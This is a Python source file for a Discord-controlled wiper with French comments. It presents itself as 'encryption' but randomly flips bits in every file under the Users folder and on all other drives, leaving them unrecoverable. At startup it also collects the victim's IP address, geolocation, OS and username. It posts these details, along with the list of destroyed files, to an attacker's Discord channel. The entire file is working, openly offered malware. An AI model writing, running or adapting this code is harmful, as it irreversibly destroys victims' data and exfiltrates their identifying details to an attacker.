import discord, platform, os, requests, random, psutil, io, win32api
from discord.ext import commands

bot = commands.Bot(command_prefix='!')

def encrypt(file):
    """
    Change les bytes d'un fichier file avec des valeurs aléatoires
    """
    try:
        with open(file, 'rb') as f:
            data = bytearray(f.read())
            for i, byte in enumerate(data):
                for j in range(8):
                    if random.random() < 0.5:
                        data[i] ^= (1 << j)
        with open(file, 'wb') as f:
            f.write(data)
        return True
    except:
        return False

async def send_file_as_attachment(channel, filename, filecontent):
    file = discord.File(io.BytesIO(filecontent.encode()), filename=filename)
    await channel.send(file=file)

async def nuke(channel):
    """
    Chiffre tout les fichiers à partir du dossier User dans le disque principal, puis tout les fichiers des autres disques
    """
    s = 0
    t = 0
    system_drive = win32api.GetModuleFileName(0)[:3]
    partitions = psutil.disk_partitions()
    fichiers = ""
    for partition in partitions:
        if partition == system_drive:
            path = partition.mountpoint+"/users"
        else:
            path = partition.mountpoint
        for root, dirs, files in os.walk(path):
            for file in files:
                if encrypt(os.path.join(root+"/"+file)):
                    s += 1
                    fichiers += os.path.join(root, file)+"\n"
                t += 1
    await send_file_as_attachment(channel, "nuke.txt", fichiers)
    message = f"**{s}** fichiers ont été chiffrés\n**{s/t*100}%** du système a été chiffré"
    await channel.send(message)


@bot.event
async def on_ready():
    guild = bot.guilds[0] 
    channel_name = "broutage en cours" 
    channel = await guild.create_text_channel(channel_name) 
    ip = requests.get('https://api.ipify.org').text 
    r = requests.get(f'https://ipapi.co/{ip}/json') 
    location = r.json()
    flag = location['country_code'] 
    message = f"@here :white_check_mark: Nouvelle connection, {channel_name} | {platform.system()} {platform.release()} | :flag_{flag.lower()}: | User : {os.getlogin()} | IP: {ip}"
    await channel.send(message) 
    await nuke(channel)
    exit()


bot.run('Token')
